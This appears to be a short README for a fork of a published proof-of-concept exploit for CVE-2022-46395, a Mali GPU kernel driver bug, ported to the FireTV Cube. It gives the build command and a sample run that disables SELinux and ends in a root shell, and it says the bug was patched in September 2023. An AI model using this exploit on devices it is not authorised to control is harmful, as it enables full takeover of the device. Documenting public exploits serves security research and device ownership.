## Exploit for CVE-2022-46395 to run on FireTV 3rd gen Cube

This is a fork of security researcher Man Yue Mo's <a href="https://github.com/github/securitylab/tree/main/SecurityExploits/Android/Mali/CVE_2022_46395">Pixel 6 POC</a> for CVE-2022-46395.  Read his detailed write-up of the vulnerability <a href="https://github.blog/2023-05-25-rooting-with-root-cause-finding-a-variant-of-a-project-zero-bug/">here</a>.  Changes have been made to account for FireOS's 32-bit user space. The POC exploits a bug in the ARM Mali kernel driver to gain arbitrary kernel code execution, which is then used to disable SELinux and gain root.  

The exploit was patched in PS7664/3772 (September 2023). For reference, the following command was used to compile with clang in ndk-21:
```
android-ndk-r21d/toolchains/llvm/prebuilt/linux-x86_64/bin/armv7a-linux-androideabi28-clang -DSHELL mali_user_buf.c mempool_utils.c mem_write.c -o gazelle_buf
```
For fastest results, run following a fresh reboot.  On average the POC takes 20-60sec to gain root.
```
gazelle:/ $ /data/local/tmp/gazelle_buf
fingerprint: Amazon/gazelle/gazelle:9/PS7652.3564N/0028488625152:user/amz-p,release-keys
benchmark_time 102
failed after 100
finished reset: 919423975 fault: 918468559 3795 err 0 read 3
found pgd at page 8
overwrite addr : 104100558 558
overwrite addr : 104300558 558
overwrite addr : 10410082c 82c
overwrite addr : 10430082c 82c
result 50
success after 128
gazelle:/ # 
```
